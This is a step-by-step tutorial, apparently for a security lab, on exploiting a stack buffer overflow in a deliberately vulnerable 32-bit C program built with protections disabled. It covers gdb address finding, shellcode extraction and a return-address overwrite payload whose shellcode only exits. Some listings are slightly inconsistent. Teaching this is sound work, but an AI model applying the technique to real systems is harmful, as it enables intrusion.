## 0. AITA for Exploiting a Bug?

Imagine you get a tiny coffee cup at a café—but instead of stopping at the top, you keep pouring, spilling coffee everywhere (even onto someone’s laptop). That’s similar to how a buffer overflow works in a program!

In our vulnerable C program, a small buffer is allocated (8 bytes) for a name input, but because the program uses an unsafe function that doesn’t check the input length (namely, `gets()`), we can overflow this buffer. By overflowing, we overwrite the saved return address in memory and hijack program execution—much like spilling coffee in just the right spot to shut down a laptop.

---

## 1. Compiling the Vulnerable Program

We start with a source file (`vuln.c`) that looks like this:

```
#include <stdio.h>
void vuln() {
   char buffer[8]; // a small buffer (only 8 bytes)
   gets(buffer);  // unsafe: does not limit input size
} 
int main() { 
   vuln();  // calls the function containing the vulnerability
   while (1) { }  // keeps the program running indefinitely
}
```

To make exploitation easier, we compile without modern security mechanisms using this command:

```
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
```

**Flag explanations:**

- **-m32**: Compile for 32-bit architecture  
- **-fno-stack-protector**: Disable stack protection (no canary values)  
- **-mpreferred-stack-boundary=2**: Forces a 4-byte aligned stack  
- **-fno-pie**: Disables Position Independent Executable  
- **-ggdb**: Includes debugging symbols  
- **-z execstack**: Allows execution of code on the stack

*Note: If you run into an error like `fatal error: bits/libc-header-start.h: No such file or directory`, you need to install multilib support:*

```
$ sudo apt update
$ sudo apt install gcc-multilib libc6-dev-i386
```

After installing the required dependencies, recompile the program. You might see warnings about using the deprecated `gets()` function, but that’s expected.

---

## 2. Finding Addresses with gdb

Next, we use gdb to locate where our buffer is stored in memory and identify the saved return address to be overwritten.

Start gdb:

```
$ gdb vuln
```

Set a breakpoint at the vulnerable function (at the line with `gets(buffer);`):

```
(gdb) break 1
```

Run the program:

```
(gdb) run
```

At the breakpoint, inspect the address of the buffer:

```
(gdb) print &buffer
```

For example, you might see:

```
$1 = (char (*)[8]) 0xffffd028
```

Now, check the registers (especially the instruction pointer `eip`):

```
(gdb) info registers
```

Then, examine the stack frame to locate the saved return address:

```
(gdb) info frame
```

You might see that the saved return address is stored at an address such as `0xffffd034`. This is the target we want to overwrite with our shellcode’s address.

## 3. Obtaining Machine Code

We need to craft shellcode that will cleanly exit the program. Start by writing a small assembly snippet in a file (for example, `asm.c`):

**Original version:**

```
#include <stdio.h>
int main() {
    __asm__("xor %eax, %eax;"
            "inc %eax;"
            "mov %ebx, %eax;"
            "leave;"
            "ret;");
}
```

Compile with:

```
$ gcc -m32 -fno-stack-protector -fno-pie -ggdb -z execstack -std=c99 asm.c -o asm
```

Then use `objdump` to extract the machine code:

```
$ objdump -d asm > asmdump
```

The dump will show instructions such as:

- `31 c0` → `xor    %eax, %eax`
- `40`    → `inc    %eax`
- `89 c3` → `mov    %eax, %ebx`
- `cd 80` → `int    $0x80`

**Modified version for clean exit:**

To exit the program with code 1, we modify the assembly code:

```
#include <stdio.h>
int main() {
    __asm__("xor %eax, %eax;"  // set EAX = 0
            "inc %eax;"        // EAX = 1 (system call for exit)
            "mov %eax, %ebx;"  // move exit code 1 into EBX (argument for exit)
            "int 0x80;");      // trigger system call interrupt
}
```

Recompile and run `objdump` again to get the modified machine code. The final shellcode in hex becomes:

```
"\x31\xc0\x40\x89\xc3\xcd\x80"
```

## 4. Writing Down the Shellcode and Constructing the Payload

Save your shellcode along with additional padding and the address overwrite into a file named `egg`. For example:

```
echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > egg
```

Here’s what each part represents:

- **Padding (`\x41`…):** Fills the buffer (ASCII 'A's).
- **Address overwrite (`\x28\xd0\xff\xff`):** Overwrites the saved return address with the start of the buffer (e.g., `0xffffd028`).
- **Shellcode (`\x31\xc0\x40\x89\xc3\xcd\x80`):** Executes the system call to exit with code 1.

You can tweak the number of padding bytes or the address depending on your environment.

---

## 5. Running the Program in gdb

Finally, test the exploit using gdb by feeding the `egg` file to the vulnerable program:

```
$ gdb vuln
```

Within gdb, run:

```
(gdb) run < egg
```

A successful exploit will hijack execution so that the shellcode is run, and you should see the program exit with code 01:

```
[Inferior 1 (process ...) exited with code 01]
```

This confirms that the buffer overflow successfully redirected execution to your shellcode.
